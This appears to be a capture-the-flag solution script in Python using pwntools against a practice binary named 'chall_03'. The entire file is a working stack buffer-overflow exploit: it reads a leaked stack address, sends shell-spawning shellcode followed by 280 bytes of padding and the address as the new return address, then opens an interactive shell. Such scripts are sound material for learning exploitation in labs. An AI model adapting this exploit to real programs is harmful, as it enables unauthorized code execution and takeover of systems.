from pwn import *

context.arch = "amd64"

elf = ELF("./chall_03")

p = process("./chall_03")

p.recvuntil("\n")

leak = p.recv()

stack = int(leak[-15:], 16)

payload = asm(shellcraft.sh()) + b's' * 280 + p64(stack)

p.sendline(payload)

p.interactive()
